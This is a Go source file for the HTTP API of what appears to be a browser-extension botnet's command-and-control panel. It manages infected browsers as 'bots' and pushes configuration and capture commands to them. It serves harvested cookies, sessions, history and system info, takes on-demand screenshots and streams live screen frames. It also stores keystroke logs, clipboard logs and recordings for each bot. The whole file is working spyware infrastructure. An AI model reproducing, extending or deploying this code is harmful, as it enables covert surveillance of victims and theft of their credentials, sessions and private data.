package api

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"net/http"
	"strconv"
	"strings"
	"time"

	"github.com/go-chi/chi/v5"
	"github.com/google/uuid"
	"gorm.io/gorm"

	"github.com/s045pd/umbra/internal/db/models"
	"github.com/s045pd/umbra/internal/live"
)

// BotsAPI groups bot management routes.
type BotsAPI struct {
	DB  *gorm.DB
	RPC BotRPC
	Hub *live.Hub
}

// botSummary mirrors the Node.js bot list payload shape.
//
// IMPORTANT: tabs and history are returned as COUNTS (int), not arrays —
// matches the original Node SQL using json_array_length(). The Vue GUI
// renders `Tabs[{{ info.tabs }}]` and expects a number; if we returned
// the full array the button label would render the entire JSON. The
// full arrays are still available via /api/v1/fields?field=tabs|history.
//
// createdAt is also exposed because the GUI's "first seen" badge uses
// `info.createdAt | moment(...)`.
type botSummary struct {
	ID                uuid.UUID      `json:"id"`
	Name              string         `json:"name"`
	BrowserID         string         `json:"browser_id"`
	IsOnline          bool           `json:"is_online"`
	LastOnline        string         `json:"last_online"`
	LastActiveAt      string         `json:"last_active_at,omitempty"`
	CreatedAt         string         `json:"createdAt"`
	ProxyUsername     string         `json:"proxy_username"`
	ProxyPassword     string         `json:"proxy_password"`
	State             string         `json:"state"`
	UserAgent         string         `json:"user_agent"`
	CurrentTab        models.JSONMap `json:"current_tab"`
	CurrentTabImage   bool           `json:"current_tab_image"`
	CurrentTabImageAt string         `json:"current_tab_image_at,omitempty"`
	Tabs              int            `json:"tabs"`
	History           int            `json:"history"`
	SwitchConfig      models.JSONMap `json:"switch_config"`
	DataConfig        models.JSONMap `json:"data_config"`
}

func formatOptionalTime(t *time.Time) string {
	if t == nil {
		return ""
	}
	return t.UTC().Format("2006-01-02T15:04:05.000Z")
}

func botToSummary(b *models.Bot) botSummary {
	last := formatOptionalTime(b.LastActiveAt)
	ct := b.CurrentTab
	if ct == nil {
		ct = models.JSONMap{}
	}
	return botSummary{
		ID:                b.ID,
		Name:              b.Name,
		BrowserID:         b.BrowserID,
		IsOnline:          b.IsOnline,
		LastOnline:        b.LastOnline.UTC().Format("2006-01-02T15:04:05.000Z"),
		LastActiveAt:      last,
		CreatedAt:         b.CreatedAt.UTC().Format("2006-01-02T15:04:05.000Z"),
		ProxyUsername:     b.ProxyUsername,
		ProxyPassword:     b.ProxyPassword,
		State:             b.State,
		UserAgent:         b.UserAgent,
		CurrentTab:        ct,
		CurrentTabImage:   b.CurrentTabImage != "",
		CurrentTabImageAt: formatOptionalTime(b.CurrentTabImageAt),
		Tabs:              len(b.Tabs),
		History:           len(b.History),
		SwitchConfig:      b.SwitchConfig,
		DataConfig:        b.DataConfig,
	}
}

// Get is GET /api/v1/bots/{bot_id} — single bot lookup for the detail page.
func (a *BotsAPI) Get(w http.ResponseWriter, r *http.Request) {
	idStr := chi.URLParam(r, "bot_id")
	id, err := uuid.Parse(idStr)
	if err != nil {
		JSONErr(w, http.StatusBadRequest, "invalid bot_id")
		return
	}
	var b models.Bot
	if err := a.DB.Where("id = ?", id).First(&b).Error; err != nil {
		if errors.Is(err, gorm.ErrRecordNotFound) {
			JSONErr(w, http.StatusNotFound, "bot not found")
			return
		}
		JSONErr(w, http.StatusInternalServerError, "lookup failed")
		return
	}
	s := botToSummary(&b)
	if a.RPC != nil {
		s.IsOnline = a.RPC.IsBotOnline(b.ID)
	}
	JSONOK(w, s)
}

// List is GET /api/v1/bots?page=&limit=&name=&is_online=&state=
func (a *BotsAPI) List(w http.ResponseWriter, r *http.Request) {
	q := r.URL.Query()
	page, _ := strconv.Atoi(q.Get("page"))
	if page < 1 {
		page = 1
	}
	limit, _ := strconv.Atoi(q.Get("limit"))
	if limit < 1 || limit > 200 {
		limit = 50
	}
	offset := (page - 1) * limit

	tx := a.DB.Model(&models.Bot{})
	if v := q.Get("name"); v != "" {
		tx = tx.Where("name LIKE ?", "%"+v+"%")
	}
	if v := q.Get("is_online"); v != "" {
		tx = tx.Where("is_online = ?", v == "true")
	}
	if v := q.Get("state"); v != "" {
		tx = tx.Where("state = ?", v)
	}

	var total int64
	if err := tx.Count(&total).Error; err != nil {
		JSONErr(w, http.StatusInternalServerError, "count failed")
		return
	}
	var rows []models.Bot
	// Sequelize created the column as "createdAt" (camelCase, double-quoted in
	// the original DDL). Postgres folds unquoted identifiers to lowercase, so
	// we must keep the quotes here.
	if err := tx.Order(`"createdAt" DESC`).Limit(limit).Offset(offset).Find(&rows).Error; err != nil {
		JSONErr(w, http.StatusInternalServerError, "list failed")
		return
	}
	out := make([]botSummary, 0, len(rows))
	for i := range rows {
		s := botToSummary(&rows[i])
		// DB is_online may be stale across non-graceful restarts (defer
		// markOffline didn't run) and lags the WS lifecycle by one DB
		// round-trip. The WS Registry is the source of truth for "is
		// there an open socket right now"; let it override.
		if a.RPC != nil {
			s.IsOnline = a.RPC.IsBotOnline(rows[i].ID)
		}
		out = append(out, s)
	}

	JSONOK(w, map[string]any{
		"bots": out,
		"pagination": map[string]any{
			"total":      total,
			"page":       page,
			"limit":      limit,
			"totalPages": (total + int64(limit) - 1) / int64(limit),
		},
	})
}

type updateBotReq struct {
	BotID         string         `json:"bot_id"`
	Name          *string        `json:"name,omitempty"`
	ProxyUsername *string        `json:"proxy_username,omitempty"`
	ProxyPassword *string        `json:"proxy_password,omitempty"`
	SwitchConfig  map[string]any `json:"switch_config,omitempty"`
	DataConfig    map[string]any `json:"data_config,omitempty"`
}

// Update is PUT /api/v1/bots
func (a *BotsAPI) Update(w http.ResponseWriter, r *http.Request) {
	var body updateBotReq
	if !MustDecode(w, r, &body) {
		return
	}
	id, err := uuid.Parse(body.BotID)
	if err != nil {
		JSONErr(w, http.StatusBadRequest, "invalid bot_id")
		return
	}
	updates := map[string]any{}
	if body.Name != nil {
		updates["name"] = *body.Name
	}
	if body.ProxyUsername != nil {
		updates["proxy_username"] = *body.ProxyUsername
	}
	if body.ProxyPassword != nil {
		updates["proxy_password"] = *body.ProxyPassword
	}
	if body.SwitchConfig != nil {
		updates["switch_config"] = models.JSONMap(body.SwitchConfig)
	}
	if body.DataConfig != nil {
		updates["data_config"] = models.JSONMap(body.DataConfig)
	}
	if len(updates) == 0 {
		JSONErr(w, http.StatusBadRequest, "no fields to update")
		return
	}
	res := a.DB.Model(&models.Bot{}).Where("id = ?", id).Updates(updates)
	if res.Error != nil {
		JSONErr(w, http.StatusInternalServerError, "update failed")
		return
	}
	if res.RowsAffected == 0 {
		JSONErr(w, http.StatusNotFound, "bot not found")
		return
	}

	// Push updated config to bot if online
	if a.RPC != nil && (body.SwitchConfig != nil || body.DataConfig != nil) {
		var bot models.Bot
		if err := a.DB.Select("browser_id").Where("id = ?", id).First(&bot).Error; err == nil && bot.BrowserID != "" {
			payload := map[string]any{}
			if body.SwitchConfig != nil {
				payload["switch_config"] = body.SwitchConfig
			}
			if body.DataConfig != nil {
				payload["data_config"] = body.DataConfig
			}
			go a.RPC.CallBot(context.Background(), bot.BrowserID, "CONFIG_UPDATE", payload)
		}
	}

	JSONOK(w, struct{}{})
}

type deleteBotReq struct {
	BotID string `json:"bot_id"`
}

// Delete is DELETE /api/v1/bots
func (a *BotsAPI) Delete(w http.ResponseWriter, r *http.Request) {
	var body deleteBotReq
	if !MustDecode(w, r, &body) {
		return
	}
	id, err := uuid.Parse(body.BotID)
	if err != nil {
		JSONErr(w, http.StatusBadRequest, "invalid bot_id")
		return
	}
	if err := a.cascadeDelete(id); err != nil {
		JSONErr(w, http.StatusInternalServerError, "delete failed")
		return
	}
	JSONOK(w, struct{}{})
}

type batchDeleteReq struct {
	BotIDs []string `json:"bot_ids"`
}

// BatchDelete is POST /api/v1/bots/batch-delete
func (a *BotsAPI) BatchDelete(w http.ResponseWriter, r *http.Request) {
	var body batchDeleteReq
	if !MustDecode(w, r, &body) {
		return
	}
	if len(body.BotIDs) == 0 {
		JSONErr(w, http.StatusBadRequest, "bot_ids required")
		return
	}
	ids := make([]uuid.UUID, 0, len(body.BotIDs))
	for _, s := range body.BotIDs {
		id, err := uuid.Parse(s)
		if err != nil {
			JSONErr(w, http.StatusBadRequest, "invalid bot_id: "+s)
			return
		}
		ids = append(ids, id)
	}
	deleted := 0
	for _, id := range ids {
		if err := a.cascadeDelete(id); err == nil {
			deleted++
		}
	}
	JSONOK(w, map[string]any{"deletedCount": deleted})
}

func (a *BotsAPI) cascadeDelete(id uuid.UUID) error {
	return a.DB.Transaction(func(tx *gorm.DB) error {
		if err := tx.Where("bot_id = ?", id).Delete(&models.BotScreenshot{}).Error; err != nil {
			return err
		}
		if err := tx.Where("bot_id = ?", id).Delete(&models.BotKeyboardLog{}).Error; err != nil {
			return err
		}
		if err := tx.Where("bot_id = ?", id).Delete(&models.BotClipboardLog{}).Error; err != nil {
			return err
		}
		if err := tx.Where("bot = ?", id).Delete(&models.BotRecording{}).Error; err != nil {
			return err
		}
		if err := tx.Where("bot_id = ?", id).Delete(&models.BotNavEvent{}).Error; err != nil {
			return err
		}
		if err := tx.Where("bot_id = ?", id).Delete(&models.BotAlert{}).Error; err != nil {
			return err
		}
		if err := tx.Where("bot_id = ?", id).Delete(&models.BotDeltaEvent{}).Error; err != nil {
			return err
		}
		if err := tx.Where("bot_id = ?", id).Delete(&models.BotPageStorage{}).Error; err != nil {
			return err
		}
		if err := tx.Where("id = ?", id).Delete(&models.Bot{}).Error; err != nil {
			return err
		}
		return nil
	})
}

// Image is GET /api/v1/bots/image/{bot_id}
func (a *BotsAPI) Image(w http.ResponseWriter, r *http.Request) {
	idStr := chi.URLParam(r, "bot_id")
	id, err := uuid.Parse(idStr)
	if err != nil {
		JSONErr(w, http.StatusBadRequest, "invalid bot_id")
		return
	}
	var b models.Bot
	if err := a.DB.Where("id = ?", id).First(&b).Error; err != nil {
		if errors.Is(err, gorm.ErrRecordNotFound) {
			JSONErr(w, http.StatusNotFound, "bot not found")
			return
		}
		JSONErr(w, http.StatusInternalServerError, "lookup failed")
		return
	}
	img := b.CurrentTabImage
	if img == "" {
		w.WriteHeader(http.StatusNoContent)
		return
	}

	ct := "image/jpeg"
	payload := img
	if idx := strings.Index(img, ";base64,"); idx != -1 {
		prefix := img[:idx]
		ct = strings.TrimPrefix(prefix, "data:")
		payload = img[idx+len(";base64,"):]
	}

	raw, err := base64.StdEncoding.DecodeString(payload)
	if err != nil {
		w.Header().Set("Content-Type", ct)
		_, _ = w.Write([]byte(img))
		return
	}
	w.Header().Set("Content-Type", ct)
	w.Header().Set("Cache-Control", "no-cache")
	if b.CurrentTabImageAt != nil {
		w.Header().Set("Last-Modified", b.CurrentTabImageAt.UTC().Format(http.TimeFormat))
	}
	_, _ = w.Write(raw)
}

// Snapshot is GET /api/v1/bots/{bot_id}/snapshot — request a full-resolution
// screenshot from the extension via synchronous RPC. Falls back to the stored
// thumbnail if the bot is offline.
func (a *BotsAPI) Snapshot(w http.ResponseWriter, r *http.Request) {
	idStr := chi.URLParam(r, "bot_id")
	id, err := uuid.Parse(idStr)
	if err != nil {
		JSONErr(w, http.StatusBadRequest, "invalid bot_id")
		return
	}
	var b models.Bot
	if err := a.DB.Select("browser_id", "current_tab_image").
		Where("id = ?", id).First(&b).Error; err != nil {
		if errors.Is(err, gorm.ErrRecordNotFound) {
			JSONErr(w, http.StatusNotFound, "bot not found")
			return
		}
		JSONErr(w, http.StatusInternalServerError, "lookup failed")
		return
	}

	img := ""
	if a.RPC != nil && b.BrowserID != "" {
		ctx, cancel := context.WithTimeout(r.Context(), 5*time.Second)
		defer cancel()
		resp, err := a.RPC.CallBot(ctx, b.BrowserID, "CAPTURE_TAB_IMAGE", nil)
		if err == nil {
			if s, ok := resp["image"].(string); ok && s != "" {
				img = s
			}
		}
	}
	if img == "" {
		img = b.CurrentTabImage
	}
	if img == "" {
		w.WriteHeader(http.StatusNoContent)
		return
	}

	ct := "image/jpeg"
	payload := img
	if idx := strings.Index(img, ";base64,"); idx != -1 {
		prefix := img[:idx]
		ct = strings.TrimPrefix(prefix, "data:")
		payload = img[idx+len(";base64,"):]
	}
	raw, err := base64.StdEncoding.DecodeString(payload)
	if err != nil {
		w.Header().Set("Content-Type", ct)
		_, _ = w.Write([]byte(img))
		return
	}
	w.Header().Set("Content-Type", ct)
	w.Header().Set("Cache-Control", "no-cache")
	_, _ = w.Write(raw)
}

// Field is GET /api/v1/fields?field=<name>&id=<bot_id>
func (a *BotsAPI) Field(w http.ResponseWriter, r *http.Request) {
	q := r.URL.Query()
	field := q.Get("field")
	idStr := q.Get("id")
	id, err := uuid.Parse(idStr)
	if err != nil {
		JSONErr(w, http.StatusBadRequest, "invalid id")
		return
	}
	allowed := map[string]string{
		"recording":    "recording",
		"tabs":         "tabs",
		"cookies":      "cookies",
		"history":      "history",
		"bookmarks":    "bookmarks",
		"downloads":    "downloads",
		"activity":     "activity",
		"sessions":     "sessions",
		"top_sites":    "top_sites",
		"system_info":  "system_info",
		"reading_list": "reading_list",
	}
	col, ok := allowed[field]
	if !ok {
		JSONErr(w, http.StatusBadRequest, "field not allowed")
		return
	}
	var b models.Bot
	if err := a.DB.Select(col).Where("id = ?", id).First(&b).Error; err != nil {
		JSONErr(w, http.StatusNotFound, "bot not found")
		return
	}
	switch col {
	case "recording":
		JSONOK(w, b.Recording)
	case "tabs":
		JSONOK(w, b.Tabs)
	case "cookies":
		JSONOK(w, b.Cookies)
	case "history":
		JSONOK(w, b.History)
	case "bookmarks":
		JSONOK(w, b.Bookmarks)
	case "downloads":
		JSONOK(w, b.Downloads)
	case "activity":
		JSONOK(w, b.Activity)
	case "sessions":
		JSONOK(w, b.Sessions)
	case "top_sites":
		JSONOK(w, b.TopSites)
	case "system_info":
		JSONOK(w, b.SystemInfo)
	case "reading_list":
		JSONOK(w, b.ReadingList)
	}
}

type liveReq struct {
	Active   bool   `json:"active"`
	Interval int    `json:"interval,omitempty"`
	Quality  string `json:"quality,omitempty"`
}

var liveQualityPresets = map[string]map[string]any{
	"low":    {"REALTIME_IMG_QUALITY": 30, "REALTIME_IMG_MAX_WIDTH": 480, "REALTIME_IMG_REENCODE_QUALITY": 25},
	"medium": {"REALTIME_IMG_QUALITY": 50, "REALTIME_IMG_MAX_WIDTH": 800, "REALTIME_IMG_REENCODE_QUALITY": 40},
	"high":   {"REALTIME_IMG_QUALITY": 80, "REALTIME_IMG_MAX_WIDTH": 1280, "REALTIME_IMG_REENCODE_QUALITY": 65},
}

// Live is POST /api/v1/bots/{bot_id}/live — push realtime capture
// settings to the extension. When active=false the extension reverts
// to its built-in defaults.
func (a *BotsAPI) Live(w http.ResponseWriter, r *http.Request) {
	idStr := chi.URLParam(r, "bot_id")
	id, err := uuid.Parse(idStr)
	if err != nil {
		JSONErr(w, http.StatusBadRequest, "invalid bot_id")
		return
	}
	var body liveReq
	if !MustDecode(w, r, &body) {
		return
	}

	var b models.Bot
	if err := a.DB.Select("browser_id", "switch_config", "data_config").
		Where("id = ?", id).First(&b).Error; err != nil {
		if errors.Is(err, gorm.ErrRecordNotFound) {
			JSONErr(w, http.StatusNotFound, "bot not found")
			return
		}
		JSONErr(w, http.StatusInternalServerError, "lookup failed")
		return
	}

	dc := map[string]any{}
	sc := map[string]any{}

	if body.Active {
		interval := body.Interval
		if interval < 200 {
			interval = 500
		}
		dc["REALTIME_IMG_INTERVAL"] = interval

		preset, ok := liveQualityPresets[body.Quality]
		if !ok {
			preset = liveQualityPresets["high"]
		}
		for k, v := range preset {
			dc[k] = v
		}
		sc["REALTIME_IMG"] = true
	} else {
		sc["REALTIME_IMG"] = false
		dc["REALTIME_IMG_INTERVAL"] = 2000
		dc["REALTIME_IMG_QUALITY"] = 40
		dc["REALTIME_IMG_MAX_WIDTH"] = 640
		dc["REALTIME_IMG_REENCODE_QUALITY"] = 35
	}

	merged := models.JSONMap{}
	for k, v := range b.DataConfig {
		merged[k] = v
	}
	for k, v := range dc {
		merged[k] = v
	}

	mergedSC := models.JSONMap{}
	for k, v := range b.SwitchConfig {
		mergedSC[k] = v
	}
	for k, v := range sc {
		mergedSC[k] = v
	}

	updates := map[string]any{
		"data_config":   merged,
		"switch_config": mergedSC,
	}

	if err := a.DB.Model(&models.Bot{}).Where("id = ?", id).Updates(updates).Error; err != nil {
		JSONErr(w, http.StatusInternalServerError, "update failed")
		return
	}

	if a.RPC != nil && b.BrowserID != "" {
		payload := map[string]any{
			"data_config":   dc,
			"switch_config": sc,
		}
		go a.RPC.CallBot(context.Background(), b.BrowserID, "CONFIG_UPDATE", payload)
	}

	JSONOK(w, map[string]any{"active": body.Active})
}

// LiveStream is GET /api/v1/bots/{bot_id}/live-stream — SSE of thumbnail ticks.
func (a *BotsAPI) LiveStream(w http.ResponseWriter, r *http.Request) {
	id, err := uuid.Parse(chi.URLParam(r, "bot_id"))
	if err != nil {
		JSONErr(w, http.StatusBadRequest, "invalid bot_id")
		return
	}
	flusher, ok := w.(http.Flusher)
	if !ok {
		JSONErr(w, http.StatusInternalServerError, "streaming unsupported")
		return
	}
	w.Header().Set("Content-Type", "text/event-stream")
	w.Header().Set("Cache-Control", "no-cache")
	w.Header().Set("Connection", "keep-alive")
	w.WriteHeader(http.StatusOK)
	flusher.Flush()

	ch, cancel := a.Hub.Subscribe(id)
	defer cancel()
	ticker := time.NewTicker(15 * time.Second)
	defer ticker.Stop()

	writeEvent := func(name string, payload any) bool {
		raw, _ := json.Marshal(payload)
		if _, err := fmt.Fprintf(w, "event: %s\ndata: %s\n\n", name, raw); err != nil {
			return false
		}
		flusher.Flush()
		return true
	}
	_ = writeEvent("ping", map[string]any{"ok": true})

	for {
		select {
		case <-r.Context().Done():
			return
		case <-ticker.C:
			if !writeEvent("ping", map[string]any{"ok": true}) {
				return
			}
		case frame, ok := <-ch:
			if !ok {
				return
			}
			if !writeEvent("frame", map[string]any{
				"bot_id": frame.BotID.String(),
				"at":     frame.At.UTC().Format(time.RFC3339Nano),
			}) {
				return
			}
		}
	}
}
